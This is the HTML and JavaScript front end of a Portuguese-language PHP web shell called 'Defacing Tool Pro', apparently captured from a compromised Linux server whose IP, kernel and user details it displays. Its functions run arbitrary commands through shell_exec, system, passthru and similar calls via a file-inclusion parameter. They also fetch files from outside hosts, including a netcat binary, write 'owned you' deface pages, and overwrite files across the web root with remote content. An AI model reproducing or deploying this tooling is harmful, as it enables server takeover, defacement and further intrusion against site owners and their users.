<body onload="focar();">
<style>.campo{font-family: Verdana; color:white;font-size:11px;background-color:#414978;height:23px}
.infop{font-family: verdana; font-size: 10px; color:#000000;}
.infod{font-family: verdana; font-size: 10px; color:#414978;}
.algod{font-family: verdana; font-size: 12px; font-weight: bold; color: #414978;}
.titulod{font:Verdana; color:#414978; font-size:20px;}</style>
<script>
function inclVar(){var addr = location.href.substring(0,location.href.indexOf('?')+1);var stri = location.href.substring(addr.length,location.href.length+1);inclvar = stri.substring(0,stri.indexOf('='));}
function enviaCMD(){inclVar();window.document.location.href=''+'?'+inclvar+'='+''+'?&'+'cmd='+window.document.formulario.cmd.value;return false;}
function ativaFe(qual){inclVar();window.document.location.href=''+'?'+inclvar+'='+''+'?&'+'fu='+qual+'&cmd='+window.document.formulario.cmd.value;return false;}
function PHPget(){inclVar(); if(confirm("O PHPget agora oferece uma lista pronta de urls,\nvc soh precisa escolher qual arquivo enviar para o servidor.\nDeseja utilizar isso? \nClique em Cancel para usar o PHPget normal, ou \nem Ok para usar esse novo recurso."))goPreGet(); else{var c=prompt("[ PHPget ] by r3v3ng4ns\nDigite a ORIGEM do arquivo (url) com ate 7Mb\n-Utilize caminho completo\n-Se for remoto, use http:// ou ftp://:","http://hostinganime.com/tool/nc.dat");var dir = c.substring(0,c.lastIndexOf('/')+1);var file = c.substring(dir.length,c.length+1);var p=prompt("[ PHPget ] by r3v3ng4ns\nDigite o DESTINO do arquivo\n-Utilize caminho completo\n-O diretorio de destino deve ser writable","/var/www/html/"+file);window.open(''+'?'+inclvar+'='+''+'?&'+'inclvar='+inclvar+'&'+'c='+c+'&p='+p);}}
function goPreGet(){inclVar();window.open(''+'?'+inclvar+'='+''+'?&'+'inclvar='+inclvar+'&'+'pre=1');}
function PHPwriter(){inclVar();var url=prompt("[ PHPwriter ] by r3v3ng4ns\nDigite a URL do frame","http://hostinganime.com/tool/reven.htm");var dir = url.substring(0,url.lastIndexOf('/')+1);var file = url.substring(dir.length,url.length+1);var f=prompt("[ PHPwriter ] by r3v3ng4ns\nDigite o Nome do arquivo a ser criado\n-Utilize caminho completo\n-O diretorio de destino deve ser writable","/var/www/html/"+file); t=prompt("[ PHPwriter ] by r3v3ng4ns\nDigite o Title da pagina","[ r00ted team ] owned you :P - by r3v3ng4ns");window.open(''+'?'+inclvar+'='+''+'?&'+'inclvar='+inclvar+'&'+'url='+url+'&f='+f+'&t='+t);}
function PHPf(){inclVar();var o=prompt("[ PHPfilEditor ] by r3v3ng4ns\nDigite o nome do arquivo que deseja abrir\n-Utilize caminho completo\n-Abrir arquivos remotos, use http:// ou ftp://","/var/www/html/index.php"); var dir = o.substring(0,o.lastIndexOf('/')+1);var file = o.substring(dir.length,o.length+1);window.open('?'+inclvar+'=?&inclvar='+inclvar+'&o='+o);}
function safeMode(){inclVar();if (confirm ('Deseja ativar o DTool com suporte a SafeMode?')){window.document.location.href=''+'?'+inclvar+'='+''+'?&';}else{ return false }}
function list(turn){inclVar();if(turn=="off")turn=0;else if(turn=="on")turn=1; window.document.location.href=''+'?'+inclvar+'='+''+'?&'+'list='+turn+'&cmd='+window.document.formulario.cmd.value;return false;}
function overwrite(){inclVar();if(confirm("O script tentara substituir todos os arquivos (do diretorio atual) que\nteem no nome a palavra chave especificada. Os arquivos serao\nsubstituidos pelo novo arquivo, especificado por voce.\n\nLembre-se!\n-Se for para substituir arquivos com a extensao jpg, utilize\ncomo palavra chave .jpg (inclusive o ponto!)\n-Utilize caminho completo para o novo arquivo, e se for remoto,\nutilize http:// e ftp://")){keyw=prompt("Digite a palavra chave",".jpg");newf=prompt("Digite a origem do arquivo que substituira","http://www.colegioparthenon.com.br/ingles/bins/revenmail.jpg");if(confirm("Se ocorrer um erro e o arquivo nao puder ser substituido, deseja\nque o script apague os arquivos e crie-os novamente com o novo conteudo?\nLembre-se de que para criar novos arquivos, o diretorio deve ser writable.")){trydel=1}else{trydel=0} if(confirm("Deseja substituir todos os arquivos do diretorio\n/var/www/html que contenham a palavra\n"+keyw+" no nome pelo novo arquivo de origem\n"+newf+" ?\nIsso pode levar um tempo, dependendo da quantidade de\narquivos e do tamanho do arquivo de origem.")){window.location.href='?'+inclvar+'=?&chdir=/var/www/html&list=1&'+'&keyw='+keyw+'&newf='+newf+'&trydel='+trydel;return false;}}}
</script>
<table width="760" border="0" align="center" cellpadding="2" cellspacing="0" bgcolor="#FFFFFF">
<tr><td><div align="center" class="titulod"><b>[ Defacing Tool Pro v ] <a href="mailto:revengans@gmail.com">?</a></font><br>
<font size=3>by r3v3ng4ns - revengans@gmail.com </font>
</b></div></td></tr>
<tr><td><TABLE width="370" BORDER="0" align="center" CELLPADDING="0" CELLSPACING="0">
<TR><TD><DIV class="infop"><b>sysname:</b> Linux</DIV></TD></TR><TR><TD><DIV class="infop"><b>nodename:</b> bc78200e302e</DIV></TD></TR><TR><TD><DIV class="infop"><b>release:</b> 3.10.0-1160.119.1.el7.x86_64</DIV></TD></TR><TR><TD><DIV class="infop"><b>version:</b> #1 SMP Tue Jun 4 14:43:51 UTC 2024</DIV></TD></TR><TR><TD><DIV class="infop"><b>machine:</b> x86_64</DIV></TD></TR><TR><TD><DIV class="infop"><b>domainname:</b> (none)</DIV></TD></TR><TR><TD><DIV class="infop"><b>user:</b> uid(33) euid(33) gid(33)</DIV></TD></TR>
<TR><TD><DIV class="infod"><b>write permission:</b><? if(@is_writable($chdir)){ echo " <b>YES</b>"; }else{ echo " no"; } ?></DIV></TD></TR>
<TR><TD><DIV class="infop"><b>server info: </b> </DIV></TD></TR>
<TR><TD><DIV class="infop"><b>pro info: ip </b>132.232.103.235:8081, <i>wget</i> at /usr/bin/wget, <i>gcc</i> at /usr/bin/gcc, <i>cc</i> at /usr/bin/cc <b><i>safe_mode</i>: NO</b>, <i>PHP </i>7.4.33</DIV></TD></TR>
<? if($chdir!=getcwd()){?>
<TR><TD><DIV class="infop"><b>original path: </b>/var/www/html</DIV></TD></TR><? } ?>
<TR><TD><DIV class="infod"><b>current path: </b>/var/www/html</DIV></TD></TR></TABLE></td></tr>
<tr><td><form name="formulario" id="formulario" method="post" action="#" onSubmit="return enviaCMD()">
<table width="375" border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#414978"><tr><td><table width="370" border="0" align="center" cellpadding="1" cellspacing="1" bgcolor="white"><tr>
<td width="75"><DIV class="algod">command</DIV></td>
<td width="300"><input name="cmd" type="text" id="cmd" value='' style="width:295; font-size:12px" class="campo">
<script>
function focar(){window.document.formulario.cmd.focus();window.document.formulario.cmd.select();}
</script>
</td></tr></table><table><tr><td>
<td><input type="button" name="snd" value="send cmd" class="campo" style="background-color:#313654" onClick="enviaCMD()"><select name="qualF" id="qualF" class="campo" style="background-color:#313654" onchange="ativaFe(this.value);">
<option>using shell_exec()<option value="1">use passthru()
<option value="2">use system()
<option value="3">use exec()
<option value="4">use popen()
<option value="5">use shell_exec()
<option value="6">use proc_open()*new
<option value="0">auto detect (default)
</select><input type="button" name="getBtn" value="PHPget" class="campo" onClick="PHPget()"><input type="button" name="writerBtn" value="PHPwriter" class="campo" onClick="PHPwriter()"><br><input type="button" name="edBtn" value="fileditor" class="campo" onClick="PHPf()"><input type="button" name="listBtn" value="list files on" class="campo" onClick="list('on')"><? if ($list==1){ ?><input type="button" name="sbstBtn" value="overwrite files" class="campo" onClick="overwrite()"><input type="button" name="MkDirBtn" value="mkdir" class="campo" onClick="mkDirF()"><input type="button" name="ChModBtn" value="chmod" class="campo" onClick="chmod()"><br>
<? } ?><input type="button" name="smBtn" value="safemode" class="campo" onClick="safeMode()">
</tr></table></td></tr></table></form></td></tr>
<tr><td align="center"><DIV class="algod"><br>stdOut from "<i></i>", using <i>shell_exec()</i></i></DIV>
<TEXTAREA name="output_text" COLS="90" ROWS="10" STYLE="font-family:Courier; font-size: 12px; color:#FFFFFF; font-size:11 px; background-color:black;width:683;">
Comandos Exclusivos do DTool Pro

chdir <diretorio>; outros; cmds;
Muda o diretorio para aquele especificado e permanece nele. Eh como se fosse o 'cd' numa shell, mas precisa ser o primeiro da linha. Os arquivos listados pelo filelist sao o do diretorio especificado ex: chdir /diretorio/sub/;pwd;ls

PHPget, PHPwriter, Fileditor, File List e Overwrite
fale com o r3v3ng4ns :P</TEXTAREA><BR></td></tr>
</table>

